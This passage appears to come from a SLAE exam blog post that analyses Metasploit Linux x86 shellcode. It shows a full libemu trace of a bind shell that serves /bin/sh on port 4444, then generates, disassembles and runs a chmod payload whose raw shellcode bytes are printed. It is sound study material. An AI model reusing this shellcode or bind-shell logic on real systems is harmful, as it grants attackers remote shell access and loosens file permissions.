[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x00000007  ecx=0x00000006  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x00000007  ecx=0x00000006  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x00000006  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=6);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x00000006  ecx=0x00000006  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x00000006  ecx=0x00000005  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x00000006  ecx=0x00000005  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x00000006  ecx=0x00000005  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x00000005  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=5);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x00000005  ecx=0x00000005  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x00000005  ecx=0x00000004  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x00000005  ecx=0x00000004  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x00000005  ecx=0x00000004  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x00000004  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=4);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x00000004  ecx=0x00000004  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x00000004  ecx=0x00000003  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x00000004  ecx=0x00000003  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x00000004  ecx=0x00000003  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x00000003  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=3);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x00000003  ecx=0x00000003  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x00000003  ecx=0x00000002  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x00000003  ecx=0x00000002  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x00000003  ecx=0x00000002  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x00000002  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=2);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x00000002  ecx=0x00000002  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x00000002  ecx=0x00000001  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x00000002  ecx=0x00000001  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x00000002  ecx=0x00000001  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x00000001  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=1);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x00000001  ecx=0x00000001  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x00000001  ecx=0x00000000  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF ZF 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x00417032
[emu 0x0x9046480 debug ] eax=0x00000001  ecx=0x00000000  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF ZF 
[emu 0x0x9046480 debug ] 6A3F                            push byte 0x3f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417034
[emu 0x0x9046480 debug ] eax=0x00000001  ecx=0x00000000  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF ZF 
[emu 0x0x9046480 debug ] 58                              pop eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417035
[emu 0x0x9046480 debug ] eax=0x0000003f  ecx=0x00000000  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF ZF 
[emu 0x0x9046480 debug ] CD80                            int 0x80
int dup2(int oldfd=19, int newfd=0);
[emu 0x0x9046480 debug ] cpu state    eip=0x00417037
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF ZF 
[emu 0x0x9046480 debug ] 49                              dec ecx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417038
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF SF 
[emu 0x0x9046480 debug ] 79F8                            jns 0xfffffffa
[emu 0x0x9046480 debug ] cpu state    eip=0x0041703a
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fba  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF SF 
[emu 0x0x9046480 debug ] 682F2F7368                      push dword 0x68732f2f
[emu 0x0x9046480 debug ] cpu state    eip=0x0041703f
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb6  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF SF 
[emu 0x0x9046480 debug ] 682F62696E                      push dword 0x6e69622f
[emu 0x0x9046480 debug ] cpu state    eip=0x00417044
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00000013
[emu 0x0x9046480 debug ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF SF 
[emu 0x0x9046480 debug ] 89E3                            mov ebx,esp
[emu 0x0x9046480 debug ] cpu state    eip=0x00417046
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x9046480 debug ] esp=0x00416fb2  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF SF 
[emu 0x0x9046480 debug ] 50                              push eax
[emu 0x0x9046480 debug ] cpu state    eip=0x00417047
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x9046480 debug ] esp=0x00416fae  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF SF 
[emu 0x0x9046480 debug ] 53                              push ebx
[emu 0x0x9046480 debug ] cpu state    eip=0x00417048
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0xffffffff  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x9046480 debug ] esp=0x00416faa  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF SF 
[emu 0x0x9046480 debug ] 89E1                            mov ecx,esp
[emu 0x0x9046480 debug ] cpu state    eip=0x0041704a
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00416faa  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x9046480 debug ] esp=0x00416faa  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF SF 
[emu 0x0x9046480 debug ] B00B                            mov al,0xb
[emu 0x0x9046480 debug ] cpu state    eip=0x0041704c
[emu 0x0x9046480 debug ] eax=0x0000000b  ecx=0x00416faa  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x9046480 debug ] esp=0x00416faa  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF SF 
[emu 0x0x9046480 debug ] CD80                            int 0x80
execve
int execve (const char *dateiname=00416fb2={/bin//sh}, const char * argv[], const char *envp[]);
[emu 0x0x9046480 debug ] cpu state    eip=0x0041704e
[emu 0x0x9046480 debug ] eax=0x0000000b  ecx=0x00416faa  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x9046480 debug ] esp=0x00416faa  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF SF 
[emu 0x0x9046480 debug ] 0A00                            or al,[eax]
cpu error error accessing 0x00000004 not mapped

stepcount 112
[emu 0x0x9046480 debug ] cpu state    eip=0x00417050
[emu 0x0x9046480 debug ] eax=0x0000000b  ecx=0x00416faa  edx=0x00000000  ebx=0x00416fb2
[emu 0x0x9046480 debug ] esp=0x00416faa  ebp=0x00000000  esi=0x00000001  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF SF 
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int bind (
     int sockfd = 14;
     struct sockaddr_in * my_addr = 0x00416fc2 => 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 0 (host=0.0.0.0);
             };
             char sin_zero = "       ";
         };
     int addrlen = 16;
) =  0;
int listen (
     int s = 14;
     int backlog = 0;
) =  0;
int accept (
     int sockfd = 14;
     sockaddr_in * addr = 0x00000000 => 
         none;
     int addrlen = 0x00000010 => 
         none;
) =  19;
int dup2 (
     int oldfd = 19;
     int newfd = 14;
) =  14;
int dup2 (
     int oldfd = 19;
     int newfd = 13;
) =  13;
int dup2 (
     int oldfd = 19;
     int newfd = 12;
) =  12;
int dup2 (
     int oldfd = 19;
     int newfd = 11;
) =  11;
int dup2 (
     int oldfd = 19;
     int newfd = 10;
) =  10;
int dup2 (
     int oldfd = 19;
     int newfd = 9;
) =  9;
int dup2 (
     int oldfd = 19;
     int newfd = 8;
) =  8;
int dup2 (
     int oldfd = 19;
     int newfd = 7;
) =  7;
int dup2 (
     int oldfd = 19;
     int newfd = 6;
) =  6;
int dup2 (
     int oldfd = 19;
     int newfd = 5;
) =  5;
int dup2 (
     int oldfd = 19;
     int newfd = 4;
) =  4;
int dup2 (
     int oldfd = 19;
     int newfd = 3;
) =  3;
int dup2 (
     int oldfd = 19;
     int newfd = 2;
) =  2;
int dup2 (
     int oldfd = 19;
     int newfd = 1;
) =  1;
int dup2 (
     int oldfd = 19;
     int newfd = 0;
) =  0;
int execve (
     const char * dateiname = 0x00416fb2 => 
           = "/bin//sh";
     const char * argv[] = [
           = 0x00416faa => 
               = 0x00416fb2 => 
                   = "/bin//sh";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;
```
To explain the format for all the text here.. Let's take a look at one instruction:
```
[emu 0x0x9046480 debug ] cpu state    eip=0x00417005
[emu 0x0x9046480 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x9046480 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x9046480 debug ] Flags: PF ZF 
[emu 0x0x9046480 debug ] 43                              inc ebx
```
Each instruction includes a view of the current state during that instruction's execution.  

The first line for this instruction shows the address of the instruction pointer.  

The next 2 lines are the values in each of the registers for an easier understanding of what is being done.  

The 4th line shows any flags that are currently set.  In this instance, we can see that the Parity Flag and the Zero flag are both set.  

The last line is the instruction itself, so we can expect ebx to be 0x1 after inc ebx is executed.

Let's start with the end of the output where our syscalls are all listed out.  Since we would usually look into each syscall while stepping through to get a high level idea of what is happening.. this feature is perfect for us.

First call is:
```
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
```
We can see that a socket is made with the arguments and their values listed.  domain and type are both constants which translate to domain=AF_INET and type=SOCK_STREAM.  The return value is 14 which will be our file descriptor.

Next call is:
```
int bind (
     int sockfd = 14;
     struct sockaddr_in * my_addr = 0x00416fc2 => 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 0 (host=0.0.0.0);
             };
             char sin_zero = "       ";
         };
     int addrlen = 16;
) =  0;
```
This call shows us that the file descriptor (14) is used in this bind call.  So, we are binding the newly made socket to addr 0.0.0.0:4444, which is any address with port 4444.

Next call:
```
int listen (
     int s = 14;
     int backlog = 0;
) =  0;
```
We are setting our socket (file descriptor 14) to listen for any incoming connections to where we bound our socket (0.0.0.0:4444).

Next call:
```
int accept (
     int sockfd = 14;
     sockaddr_in * addr = 0x00000000 => 
         none;
     int addrlen = 0x00000010 => 
         none;
) =  19;
```
We are accepting the incoming connection to our socket (file descriptor 14).

There are many calls to dup2 repeated.  dup2 will redirect various inputs/outputs to where you want them to go.  If you've read through the Shell Bind TCP and Shell Reverse TCP posts, we used the same call to redirect input/output to our shells.  With that said, we can see that the inputs/outputs are being redirected through our socket.

Final call:
```
int execve (
     const char * dateiname = 0x00416fb2 => 
           = "/bin//sh";
     const char * argv[] = [
           = 0x00416faa => 
               = 0x00416fb2 => 
                   = "/bin//sh";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;
```
We see the call to execve with the filename "/bin//sh", and arg "/bin//sh".  We are executing a shell for the accepted connection.

So, as we can tell from this quick analysis all done by libemu, we have a socket that accepts a connection and gives it a shell which confirms we have a working bind shell payload.

### chmod

Let's begin analysis of the linux/x86/chmod payload from metasploit.
```c
msfvenom -p linux/x86/chmod FILE=/tmp/shdw MODE=0666 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 34 bytes
Final size of c file: 169 bytes
unsigned char buf[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0a\x00\x00\x00\x2f\x74\x6d\x70\x2f"
"\x73\x68\x64\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a"
"\x01\x58\xcd\x80";
```
To start out, I'm going to run this shellcode through ndisasm to get a quick look at the instructions and opcodes.  If we need any further tools to better understand any logic, I'll step through it in gdb but hopefully I can work through the instructions without the need for that!
```
echo -ne "\x99\x6a\x0f\x58\x52\xe8\x0a\x00\x00\x00\x2f\x74\x6d\x70\x2f\x73\x68\x64\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
00000000  99                cdq
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E80A000000        call dword 0x14
0000000A  2F                das
0000000B  746D              jz 0x7a
0000000D  702F              jo 0x3e
0000000F  7368              jnc 0x79
00000011  647700            fs ja 0x14
00000014  5B                pop ebx
00000015  68B6010000        push dword 0x1b6
0000001A  59                pop ecx
0000001B  CD80              int 0x80
0000001D  6A01              push byte +0x1
0000001F  58                pop eax
00000020  CD80              int 0x80
```
We are going to run this just to see if it works.  
```
echo "test" > /tmp/shdw
pwoer@ubuntu:~/SLAE/exam_docs$ ls -al /tmp/shdw
-rw-rw-r-- 1 pwoer pwoer 5 Feb 28 08:09 /tmp/shdw
pwoer@ubuntu:~/SLAE/exam_docs$ ./shellcode2
Shellcode Length:  7
pwoer@ubuntu:~/SLAE/exam_docs$ ls -al /tmp/shdw
-rw-rw-rw- 1 pwoer pwoer 5 Feb 28 08:09 /tmp/shdw
```
Just ignore the length 7 output.. The count was cut off because it hit the null bytes in the shellcode.

A quick look over what we see in ndisasm..\
cdq zeroes out edx, which will be used later.\
eax is set to 0xf:
```
#define __NR_chmod 15
```
So we are preparing our syscall to chmod.\
push edx with a call to 0x14.  Looking at 0x14 we see an immediate pop, so the assumption is that we are using the call pop method to get the address of a string stored in the address right after the call. With the push edx we can see that we are null terminating the string at the address that will be pushed to the stack when the call is executed.\
0x1b6 is then moved into ecx. which translates to 438 decimal.  Our chmod call from what we use in the terminal is actually octal, 438 decimal translates to 0666 in octal which is what we passed in to our shellcode creation! so ecx is our permissions number argument.\
We should check what the string is from the call pop technique. The pop is in to ebx which will be our first argument for chmod which is pathname.  Our bytes for the string are from 0xa down to 0x11 - \x2f\x74\x6D\x70\x2f\x73\x68\x64\x77\x00
```
>>> binascii.unhexlify('2f746D702f7368647700')
'/tmp/shdw\x00'
```
As we expected, our string is the path that we provided during shellcode creation!\
int 0x80 is called which gives us chmod('/tmp/shdw', 438);\
the last 3 commands issue exit();\
And we have finished our analysis!
